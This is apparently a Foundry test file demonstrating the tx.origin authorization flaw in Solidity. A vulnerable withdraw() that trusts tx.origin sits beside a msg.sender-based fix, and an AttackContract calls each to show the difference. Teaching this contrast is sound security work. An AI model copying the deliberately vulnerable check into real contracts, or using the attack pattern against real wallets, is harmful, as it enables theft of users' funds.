// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

contract TxOrigin is Test {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public {
        emit log_named_address("TxOrigin owner", owner);
        emit log_named_address("TxOrigin tx.origin", tx.origin);
        emit log_named_address("TxOrigin msg.sender", msg.sender);
        emit log_named_address("TxOrigin address", address(this));

        require(tx.origin == owner, "Not authorized");
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw_secure() public {
        emit log_named_address("TxOrigin owner", owner);
        emit log_named_address("TxOrigin tx.origin", tx.origin);
        emit log_named_address("TxOrigin msg.sender", msg.sender);
        emit log_named_address("TxOrigin address", address(this));

        require(msg.sender == owner, "Not authorized");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract AttackContract is Test {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    function attack() public {
        emit log_named_address("AttackContract tx.origin", tx.origin);
        emit log_named_address("AttackContract msg.sender", msg.sender);
        emit log_named_address("AttackContract address", address(this));

        (bool success,) = vulnerableContract.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    function attack_secure() public {
        emit log_named_address("AttackContract tx.origin", tx.origin);
        emit log_named_address("AttackContract msg.sender", msg.sender);
        emit log_named_address("AttackContract address", address(this));

        (bool success,) = vulnerableContract.call(abi.encodeWithSignature("withdraw_secure()"));
        require(success, "Attack failed");
    }

    // Function to receive Ether
    receive() external payable {}
}
